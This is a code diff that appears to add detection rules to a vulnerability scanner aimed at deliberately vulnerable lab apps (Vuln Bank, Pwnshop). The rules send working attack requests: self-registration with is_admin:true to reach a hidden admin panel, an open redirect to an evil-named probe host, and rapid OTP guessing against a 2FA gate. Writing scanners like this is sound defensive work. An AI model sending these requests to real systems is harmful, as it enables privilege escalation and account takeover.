@@ -17222,6 +17222,70 @@ const vulnbankRequestLoanNegativeAmountLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const vulnbankSup3rSecretAdminLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const username = `thugir_adm_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const registerUrl = new URL("/register", ctx.origin).toString();
+  const registerDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      username,
+      password: VULNBANK_PROBE_PASSWORD,
+      is_admin: true
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 300) return NEGATIVE;
+  try {
+    const parsed = JSON.parse(registerDoc.body) as {
+      status?: string;
+      debug_data?: { is_admin?: boolean };
+    };
+    if (parsed.status !== "success" || parsed.debug_data?.is_admin !== true) return NEGATIVE;
+  } catch {
+    return NEGATIVE;
+  }
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password: VULNBANK_PROBE_PASSWORD }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return NEGATIVE;
+  let token = "";
+  try {
+    const parsed = JSON.parse(loginDoc.body) as { status?: string; token?: string };
+    token = String(parsed.token ?? "");
+    if (parsed.status !== "success" || !token.startsWith("eyJ")) return NEGATIVE;
+  } catch {
+    return NEGATIVE;
+  }
+  const adminUrl = new URL("/sup3r_s3cr3t_admin", ctx.origin).toString();
+  const adminDoc = await ctx.probe.get(adminUrl, {
+    headers: { Authorization: `Bearer ${token}` },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (adminDoc.status < 200 || adminDoc.status >= 400) return NEGATIVE;
+  if (!/Admin Panel\s*-\s*VulnBank/i.test(adminDoc.body)) return NEGATIVE;
+  if (!/admin-sidebar|admin-layout/i.test(adminDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      registerUrl,
+      adminUrl,
+      username,
+      snippet: adminDoc.body.slice(0, 240).trim(),
+      note: "Vuln Bank POST /register with is_admin:true grants access to GET /sup3r_s3cr3t_admin admin panel — hidden admin route oracle"
+    }
+  };
+};
+
 const vulnbankCheckBalanceIdorLiveOracle: Rule = async (ctx) => {
   if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
   const username = `thugir_bal_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
@@ -26067,6 +26131,96 @@ const pwnshopMassAssignmentAdminLiveOracle: Rule = async (ctx) => {
       username,
       snippet: detailMatch[0].slice(0, 200),
       note: "Pwnshop POST /register accepts is_admin=true and role=admin mass-assignment — audit log records role: admin for self-registered account (PWN-021)"
+    }
+  };
+};
+
+const PWNSHOP_REGISTER_REDIRECT_PROBE =
+  "https://evil-open-redirect-probe.example/thugir-pwnshop-register-redirect";
+
+const pwnshopOpenRedirectRegisterLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const registerUrl = new URL("/register", ctx.origin).toString();
+  const username = `thugir_or_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const doc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: `username=${encodeURIComponent(username)}&email=${encodeURIComponent(`${username}@probe.local`)}&password=ThugirTest123!&next=${encodeURIComponent(PWNSHOP_REGISTER_REDIRECT_PROBE)}`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const location = doc.headers["location"] || "";
+  if (![301, 302, 303, 307, 308].includes(doc.status)) return NEGATIVE;
+  if (!resolvesToOpenRedirectProbe(location, ctx.origin)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: registerUrl,
+      location,
+      probe: PWNSHOP_REGISTER_REDIRECT_PROBE,
+      note: "Pwnshop POST /register with next= reflects attacker URL in 302 Location — open redirect on registration (PWN-017)"
+    }
+  };
+};
+
+async function pwnshopRegisterAndReachOtpGate(ctx: RuleContext): Promise<boolean> {
+  const username = `thugir_otp_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const email = `${username}@probe.local`;
+  const registerUrl = new URL("/register", ctx.origin).toString();
+  await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: `username=${encodeURIComponent(username)}&email=${encodeURIComponent(email)}&password=ThugirTest123!`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: `username=${encodeURIComponent(username)}&password=ThugirTest123!`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const location = loginDoc.headers["location"] || "";
+  return [301, 302, 303, 307, 308].includes(loginDoc.status) && /verify-otp/i.test(location);
+}
+
+const pwnshopVerifyOtpBruteforceLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  if (!(await pwnshopRegisterAndReachOtpGate(ctx))) return NEGATIVE;
+  const otpUrl = new URL("/verify-otp", ctx.origin).toString();
+  const otps = ["000001", "000002", "000003", "000004", "000005"];
+  let acceptedAttempts = 0;
+  for (const otp of otps) {
+    const doc = await ctx.probe.get(otpUrl, {
+      method: "POST",
+      body: `otp=${otp}`,
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      maxBytes: 8192,
+      timeoutMs: 10000
+    });
+    if (doc.status === 429) return NEGATIVE;
+    if (/too many|rate.?limit|locked out|try again later/i.test(doc.body)) return NEGATIVE;
+    if (
+      doc.status >= 200 &&
+      doc.status < 500 &&
+      /Invalid or expired code/i.test(doc.body)
+    ) {
+      acceptedAttempts++;
+    }
+  }
+  if (acceptedAttempts < otps.length) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: otpUrl,
+      attempts: otps.length,
+      note: "Pwnshop POST /verify-otp accepts rapid OTP guesses without HTTP 429 or lockout — brute-forceable 2FA oracle (PWN-015)"
     }
   };
 };
@@ -35861,6 +36015,7 @@ export const RULES: Record<string, Rule> = {
   vulnbankGraphqlIntrospectionLiveOracle,
   vulnbankV1ForgotPasswordPinLeakLiveOracle,
   vulnbankV2ForgotPasswordEnumerationLiveOracle,
+  vulnbankSup3rSecretAdminLiveOracle,
   vulnbankRequestLoanLiveOracle,
   vulnbankRequestLoanNegativeAmountLiveOracle,
   vulnbankCheckBalanceIdorLiveOracle,
@@ -36005,6 +36160,8 @@ export const RULES: Record<string, Rule> = {
   pwnshopAdminLoginSqliLiveOracle,
   pwnshopChatPromptInjectionLiveOracle,
   pwnshopMassAssignmentAdminLiveOracle,
+  pwnshopOpenRedirectRegisterLiveOracle,
+  pwnshopVerifyOtpBruteforceLiveOracle,
   brokencrystalsUserloginCssInjectionLiveOracle,
   clientSideVulnforgeAcademyEvidence,
   clientSideVulnforgeEvidence,
